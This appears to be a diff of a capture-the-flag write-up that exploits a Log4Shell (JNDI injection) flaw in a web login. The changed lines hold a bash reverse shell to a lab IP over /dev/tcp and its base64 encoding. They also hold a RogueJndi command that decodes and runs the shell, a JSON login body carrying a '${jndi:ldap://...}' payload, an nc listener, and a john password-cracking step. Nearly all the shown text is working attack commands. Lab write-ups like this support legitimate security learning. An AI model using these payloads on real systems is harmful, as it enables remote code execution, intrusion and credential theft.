@@ -59,12 +59,12 @@ After that we craft our reverse shell command and encode it in base64 to embed i
 
 @code shell
 echo 'bash -c bash -i >&/dev/tcp/[IP]/[PORT] 0>&1' | base64
-echo 'bash -c bash -i >&/dev/tcp/10.10.16.78/8001 0>&1' | base64
+echo 'bash -c bash -i >&/dev/tcp/10.10.14.189/8001 0>&1' | base64
 @end
 
 Then we run the new tool with the following command:
 @code shell
-java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuNzgvODAwMCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname 10.10.16.78
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTg5LzgwMDEgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.189"
 @end
 
 Where the long string is the base64 output from the previous command, and the hostname is the machine we're running the command in.
@@ -74,8 +74,9 @@ To have the server get the payload from rogue-jndi we need to modify our previou
 {
 	"username":"a",
 	"password":"a",
-	"remember":"${jndi:ldap://[IP]/o=tomcat}",
-	"strict":true}
+    "remember":"${jndi:ldap://[IP]:[PORT]/o=tomcat}",
+    "strict":true
+}
 @end
 
 To set up a listener we go with the usual `nc -lnvp 8001`.
@@ -111,4 +112,3 @@ john --wordlist=/usr/share/wordlists/rockyou.txt pwd.hash
 I didn't specify the format because I wasn't sure which of the thousand john SHA512 formats was the correct one and I haven't been able to reach a conclusion after an hour of research into both hashcat and john. That probably means that the John cracking is unfeasible (it shows some hours until completion which is probably outside the scope of this challenge.
 
 Let's take a break and then try the second possible method instead: Shadow Admin.
-
